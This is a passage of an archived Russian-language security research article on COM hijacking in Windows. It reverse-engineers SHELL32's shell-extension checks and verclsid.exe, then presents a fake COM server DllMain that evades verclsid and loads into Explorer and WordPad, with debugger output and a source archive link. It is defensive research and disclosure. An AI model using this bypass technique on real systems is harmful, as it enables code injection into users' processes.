    || SHRestricted(REST_ENFORCESHELLEXTSECURITY)
    &amp;&amp; !_FindPolicyEntry(
          &amp;g;_hklmApprovedExt,
          &amp;g;_hkcuApprovedExt,
          L"Software\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions\\Approved",
          pszCLSID) )
    result = S_OK;
  else
    result = _QueryClassInterface(pszCLSID, pszIID, dwClsContext);
  return result;
}</code></pre>
<p>Вначале функция проверяет, не является ли данный CLSID запрещенным. Для этого она просматривает ветки реестра <strong>HKLM\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Blocked</strong> и <strong>HKCU\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Blocked</strong>
 и пытается найти в них имя параметра, которому соответствует CLSID 
(pszCLSID). При обнаружении такого параметра (его тип не важен), функция
 возвращает ненулевое значение. Затем она проверяет политику <strong>REST_ENFORCESHELLEXTSECURITY</strong>,
 которая, будучи включенной, разрешает запуск только доверенных 
расширений SHELL, т. е. тех расширений, имена которых являются 
параметрами ключей реестра <strong>HKLM\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved</strong> и <strong>HKCU\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved</strong>. Поскольку на тестовой машине политика <strong>REST_ENFORCESHELLEXTSECURITY</strong> не включена и ключи реестра <strong>HKLM\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Blocked</strong> и <strong>HKCU\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Blocked</strong> пусты, то происходит вызов функции <strong>SHELL32!_QueryClassInterface</strong>,
 которая и возвращает ненулевое значение. Эта функция достаточно большая
 и выполняет множество проверок, прежде чем вернуть управление. Для 
простоты разобьем алгоритм функции на пункты и подробно опишем каждый из
 них. Прототип функции выглядит так:</p>
<pre><code>HRESULT __stdcall _QueryClassInterface( IN LPCWSTR pszCLSID, IN LPCWSTR pszIID, IN DWORD dwClsContext )</code></pre>
<ol>
<li>Преобразование переданных значений pszCLSID, pszIID и dwClsContext в строку вида %s %s 0x%X.</li>
<li>Поиск параметра типа <strong>REG_DWORD</strong> с именем, указанным в п. 1, в ветке реестра <strong>HKLM\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Cached</strong>. При обнаружении такого параметра, равного 0, функция возвращает управление с кодом 0, в противном случае — с кодом 1.</li>
<li>Поиск параметра типа <strong>REG_BINARY</strong> с именем, указанным в п. 1, и размером 16 байт в ветке реестра <strong>HKCU\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Cached</strong>.</li>
<li>Если параметр из п. 3 найден, то функция вначале сравнивает первые 
четыре байта. Если они равны нулю, то функция переходит к выполнению 
операций, описанных в п. 5, в противном случае выполнение функции 
завершается с кодом, равным 1.</li>
<li>Функция сравнивает третье и четвертое четырехбайтные слова со временем, полученным с помощью <strong>GetSystemTimeAsFileTime</strong>
 (см. рисунок ниже), чтобы проверить, прошло ли 10 секунд с момента 
последней записи в этот параметр. Если не прошло, то выполнение функции 
завершается с кодом, равным 0, в противном случае функция переходит к 
выполнению операций, описанных в п. 6.</li>
<li>Формирование строки вида “/S /C %s /I %s /X 0x%X”, pszCLSID, pszIID, dwClsContext.</li>
<li>Запуск процесса %WINDIR%\system32\verclsid.exe с командной строкой, указанной в п. 6.</li>
<li>Если после вызова функции <strong>CreateProcessW</strong> произошла 
ошибка ERROR_FILE_NOT_FOUND (2), то выполнение функции завершается с 
кодом, равным 1. Если произошла ошибка, которая не равняется 
ERROR_FILE_NOT_FOUND, то выполнение функции завершается с этой ошибкой. 
Если никакой ошибки не было, то функция переходит к выполнению операций,
 описанных в п. 9.</li>
<li>Функция ожидает, когда функция <strong>WaitForSingleObject</strong> завершит процесс verclsid.exe, а функция <strong>GetExitCodeProcess</strong> определит код его завершения.</li>
<li>Формирование данных для параметра реестра <strong>HKCU\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Cached</strong>с именем, указанным в п. 1. Разбор параметров представлен на рисунке.
<div class="figure"><img src="COM%20Hijacking,%20%D0%B8%D0%BB%D0%B8%20DLL%20Hijacking%20come%20back_files/image9.png" alt=""></div>
1 — управление кешированием: 0 — кеширование разрешено, 1 — запрещено;<br> 2 — произвольные данные;<br> 3 — младшие четыре байта времени, полученные с помощью функции GetSystemTimeAsFileTime;<br> 4 — старшие четыре байта времени, полученные с помощью функции GetSystemTimeAsFileTime</li>
<li>Если код завершения из п. 9 равен 0, то функция завершается с кодом, равным 1, в противном случае — с кодом, равным 0.</li>
</ol>
<p>Таким образом, мы видим, что существует достаточно много условий завершения функции <strong>SHELL32!_QueryClassInterface</strong>
 с кодом, отличным от 0. Одно из этих условий — завершение процесса 
verclsid.exe с кодом, равным 0. Проанализируем работу этой программы и 
выясним, для чего она предназначена.</p>
<h2 id="otherlink5">Исследование verclsid.exe и её обход</h2>
<p>Итак, verclsid.exe запускается функцией <strong>SHELL32!_QueryClassInterface</strong>.
 Эта программа анализирует CLSID, переданный ей в качестве параметра, и в
 зависимости от разных условий формирует код завершения. Посмотрим, с 
какими параметрами запускается verclsid.exe при открытии RTF-файла из 
нашей папки.</p>
<div class="figure"><img src="COM%20Hijacking,%20%D0%B8%D0%BB%D0%B8%20DLL%20Hijacking%20come%20back_files/image10.png" alt=""></div>
<p>Итак, у нас есть ключ /S, ключ /C, после которого идет GUID, ключ /I,
 за которым следует ещё один GUID, и ключ /X, после которого идет 
шестнадцатеричное число. Дизассемблирование файла verclsid.exe помогло 
выяснить, за что отвечают эти ключи:</p>
<ul>
<li>/S задаёт флаг COINIT_APARTMENTTHREADED для функции <strong>OLE32!CoInitializeEx</strong>;</li>
<li>/C задаёт GUID объекта компонентного класса, т. е. наш CLSID;</li>
<li>/I задаёт интерфейс coclass’a, определенного параметром /C, в данном случае IShellFolder;</li>
<li>/X задаёт параметр dwClsContext для функции <strong>OLE32!CoCreateInstance</strong>, который в данном случае равен CLSCTX_INPROC_SERVER|CLSCTX_NO_CODE_DOWNLOAD.</li>
</ul>
<p>После того, как произошел разбор командной строки и приложение 
определило все свои входные параметры, оно инициализирует COM с помощью 
функции <strong>OLE32!CoInitializeEx</strong> и создает вторичный поток <strong>WatchDog</strong>,
 который просто засыпает на 15 секунд. Если по истечении этого времени 
программа не завершается, производится её принудительное завершение с 
кодом, равным 2:</p>
<pre><code>_WatchDog@4     proc near           
    push    15000             ; dwMilliseconds
    call    ds:__imp__Sleep@4 ; Sleep(x)
    push    2                 ; uExitCode
    call    ds:__imp__GetCurrentProcess@0 ; GetCurrentProcess()
    push    eax               ; hProcess
    call    ds:__imp__TerminateProcess@8 ; TerminateProcess(x,x)
    retn    4
_WatchDog@4     endp</code></pre>
<p>Затем первичный поток вызывает функцию <strong>OLE32!CoCreateInstance</strong>:</p>
<pre><code>CoCreateInstance( “{42071714-76D4-11D1-8B24-00A0C9068FF3}”, NULL, CLSCTX_INPROC_SERVER|CLSCTX_NO_CODE_DOWNLOAD, “{000214E6-0000-0000-C000-000000000046}”, &amp;ppv )</code></pre>
<p>Если вызов <strong>OLE32!CoCreateInstance</strong> завершился 
неудачно, то программа завершается с кодом 3, в противном случае для 
только что созданного COM-объекта вызывается метод QueryInterface:</p>
<pre><code>ppv-&gt;QueryInterface("{9B45E435-34A9-4E6B-A2A1-B0ECD284967C}", &amp;ppvObject)</code></pre>
<p>Другими словами, у нашего объекта запрашивается интерфейс 
«{9B45E435-34A9-4E6B-A2A1-B0ECD284967C}». Если функция QueryInterface 
завершается с ошибкой, то программа завершается с кодом 3, в противном 
случае вызывается метод Release:</p>
<pre><code>ppv-&gt;Release()</code></pre>
<p>После этого программа вызывает функцию <strong>OLE32!CoUninitialize</strong>
 для деинициализации COM и завершается с кодом, равным 0, что нам и 
нужно. Для того чтобы написать примитивный COM-сервер, воспользуемся 
документом «Description of COM principle»[6], в котором достаточно 
подробно описан механизм работы функции <strong>OLE32!CoCreateInstance</strong>.
 Исходники COM-сервера вы сможете найти в архиве, который прилагается к 
статье. Они достаточно тривиальны, однако есть одна хитрость. Поскольку 
мы всегда возвращаем значение S_OK для любого запрашиваемого интерфейса,
 это может привести к краху некоторых приложений. Поэтому DllMain 
проверяет, какое приложение вызвало эту функцию:</p>
<div class="aside">
<p><a href="https://web.archive.org/web/20171216115326/http://blog.csdn.net/guogangj/article/details/1801788">6. Description of COM principle</a></p>
</div>
<pre><code>BOOL WINAPI
DllMain( 
    IN HINSTANCE hInstance,
    IN DWORD     dwReason,
    IN LPVOID    lpReserved
)
{
    BOOL retValue = FALSE;

    switch (dwReason) {
    case DLL_PROCESS_ATTACH:
        {
            TCHAR processPath [MAX_PATH] = { 0 };
            TCHAR verclsidPath[MAX_PATH] = { 0 };

            GetModuleFileName(NULL, processPath, _countof(processPath));
            GetWindowsDirectory(verclsidPath, MAX_PATH);
            PathAppend(verclsidPath, _T("system32\\verclsid.exe"));

            if ( 0 == StrCmpI(processPath, verclsidPath) ) {
                retValue   = TRUE;
            } else {
                // to do what you need
                // this code will run in context on another process
            }
            DisableThreadLibraryCalls( hInstance );
            break;
        }

    case DLL_THREAD_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_DETACH:
        break;
    }

    return (retValue);
}</code></pre>
<p>После этого поместим DLL в папку C:\Documents and 
Settings\Administrator, опять откроем наш RTF-файл и посмотрим на 
отладочную консоль:</p>
<pre><code>kd&gt; g 
&gt;&gt;&gt; COM-DLL-fake: DllMain: process = C:\WINDOWS\system32\verclsid.exe 
&gt;&gt;&gt; COM-DLL-fake: DllGetClassObject 
&gt;&gt;&gt; COM-DLL-fake: CSomeFactory::CSomeFactory 
&gt;&gt;&gt; COM-DLL-fake: CSomeFactory::AddRef 
&gt;&gt;&gt; COM-DLL-fake: CSomeFactory::QueryInterface 
&gt;&gt;&gt; COM-DLL-fake: CSomeFactory::AddRef 
&gt;&gt;&gt; COM-DLL-fake: CSomeFactory::Release 
&gt;&gt;&gt; COM-DLL-fake: CSomeFactory::CreateInstance 
&gt;&gt;&gt; COM-DLL-fake: CSomeCoClass::CSomeCoClass 
&gt;&gt;&gt; COM-DLL-fake: CSomeCoClass::QueryInterface 
&gt;&gt;&gt; COM-DLL-fake: CSomeCoClass::Release 
&gt;&gt;&gt; COM-DLL-fake: CSomeFactory::Release 
&gt;&gt;&gt; COM-DLL-fake: CSomeFactory::~CSomeFactory 
&gt;&gt;&gt; COM-DLL-fake: CSomeCoClass::QueryInterface 
&gt;&gt;&gt; COM-DLL-fake: CSomeCoClass::Release 
&gt;&gt;&gt; COM-DLL-fake: CSomeCoClass::QueryInterface 
&gt;&gt;&gt; COM-DLL-fake: CSomeCoClass::Release 
&gt;&gt;&gt; COM-DLL-fake: CSomeCoClass::CSomeCoClass 
&gt;&gt;&gt; COM-DLL-fake: DllMain: process = C:\WINDOWS\Explorer.EXE 
&gt;&gt;&gt; COM-DLL-fake: DllMain: process = C:\WINDOWS\Explorer.EXE 
&gt;&gt;&gt; COM-DLL-fake: DllMain: process = C:\WINDOWS\Explorer.EXE 
&gt;&gt;&gt; COM-DLL-fake: DllMain: process = C:\WINDOWS\Explorer.EXE 
&gt;&gt;&gt; COM-DLL-fake: DllMain: process = C:\WINDOWS\Explorer.EXE 
&gt;&gt;&gt; COM-DLL-fake: DllMain: process = C:\WINDOWS\Explorer.EXE 
&gt;&gt;&gt; COM-DLL-fake: DllMain: process = C:\WINDOWS\Explorer.EXE 
&gt;&gt;&gt; COM-DLL-fake: DllMain: process = C:\WINDOWS\Explorer.EXE 
&gt;&gt;&gt; COM-DLL-fake: DllMain: process = C:\WINDOWS\Explorer.EXE 
&gt;&gt;&gt; COM-DLL-fake: DllMain: process = C:\WINDOWS\Explorer.EXE 
&gt;&gt;&gt; COM-DLL-fake: DllMain: process = C:\Program Files\Windows NT\Accessories\WORDPAD.EXE 
&gt;&gt;&gt; COM-DLL-fake: DllMain: process = C:\Program Files\Windows NT\Accessories\WORDPAD.EXE 
&gt;&gt;&gt; COM-DLL-fake: DllMain: process = C:\Program Files\Windows NT\Accessories\WORDPAD.EXE</code></pre>
<p>Как видно, теперь атака проходит успешно. Заметим, что для этого DLL 
должна находиться в Current Directory процесса explorer.exe.</p>
<h2 id="otherlink6">Заключение</h2>
<p>Резюмируя, можно сказать, что атака DLL Hijacking применима и к 
COM-технологии. Однако для успешной эксплуатации уязвимости 
злоумышленнику необходимо преодолеть ряд ограничений (обход 
verclsid.exe, наличие/отсутствие ключей в разных ветках реестра). 
Возможным направлением дальнейших исследований является поиск 
COM-серверов с запретом на кеширование, уязвимых к атаке DLL Hijacking.</p>
<h2 id="otherlink7">Литература</h2>
<ol>
<li><a href="https://web.archive.org/web/20171216115326/http://blog.acrossecurity.com/2011/06/com-server-based-binary-planting-proof.html">COM Server-Based Binary Planting Proof Of Concept.</a></li>
<li><a href="https://web.archive.org/web/20171216115326/http://blog.acrossecurity.com/2011/05/silently-pwning-protected-mode-ie9-and.html">Silently Pwning Protected-Mode IE9 and Innocent Windows Applications.</a></li>
<li><a href="https://web.archive.org/web/20171216115326/http://www.codeproject.com/KB/COM/comintro.aspx?display=Print">Introduction to COM - What It Is and How to Use It.</a></li>
<li><a href="https://web.archive.org/web/20171216115326/http://www.codeproject.com/KB/COM/comintro2.aspx?display=Print">Introduction to COM Part II - Behind the Scenes of a COM Server</a></li>
<li><a href="https://web.archive.org/web/20171216115326/http://www.codeproject.com/KB/shell/NamespaceExtImpl.aspx?display=Print">An almost complete Namespace Extension Sample.</a></li>
</ol>
<h2 id="otherlink8">Приложение</h2>
<a href="https://web.archive.org/web/20171216115326/http://www.nobunkum.org/files/com-hijacking/code-com-hijacking.7z">code-com-hijacking.7z</a> <br><br>
<p class="author" style="padding-left: 0px;">Last updated: 05.04.2012</p>
</div>
  ﻿</div>
  <div id="footer">
    <p class="copyright">© 2009–2012 <a href="https://web.archive.org/web/20171216115326/http://www.nobunkum.ru/">NOBUNKUM</a> by <a href="https://web.archive.org/web/20171216115326/http://www.esagelab.ru/">Esage Lab</a> &nbsp;&nbsp;&nbsp;&nbsp;<a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/ru/">/на русском языке</a> <a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/about">/about</a> <a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/rss">/rss</a></p>
  </div>
  <script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-3546318-9']);
  _gaq.push(['_trackPageview']);
  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://web.archive.org/web/20171216115326/https://ssl' : 'https://web.archive.org/web/20171216115326/http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>


</body></html>
<!--
     FILE ARCHIVED ON 11:53:26 Dec 16, 2017 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 12:19:40 May 30, 2024.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
-->
<!--
playback timings (ms):
  captures_list: 1.354
  exclusion.robots: 0.852
  exclusion.robots.policy: 0.842
  esindex: 0.009
  cdx.remote: 8.559
  LoadShardBlock: 99.658 (3)
  PetaboxLoader3.datanode: 87.084 (4)
  PetaboxLoader3.resolve: 127.305 (2)
  load_resource: 150.464
-->